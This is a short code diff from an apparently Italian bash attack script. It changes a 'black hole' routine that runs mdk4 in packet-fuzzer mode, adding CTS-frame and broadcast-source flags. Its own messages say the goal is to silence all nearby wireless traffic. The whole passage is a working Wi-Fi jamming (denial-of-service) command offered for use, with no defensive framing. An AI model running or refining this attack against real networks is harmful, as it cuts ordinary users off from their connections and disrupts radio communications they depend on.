@@ -1461,7 +1461,9 @@ run_black_hole() {
 
     echo -e "${BLUE}[*] Creazione orizzonte degli eventi radio...${NC}"
     # mdk4 f: Packet fuzzer mode (CTS/RTS flooding)
-    mdk4 "$MON_IFACE" f &
+    # -s c: Create CTS frames
+    # -m m: Set source address to broadcast
+    mdk4 "$MON_IFACE" f -s c -m m &
     BH_PID=$!
     
     echo -e "${GREEN}[V] BUCO NERO ATTIVO. L'etere è ora un sepolcro silenzioso.${NC}"
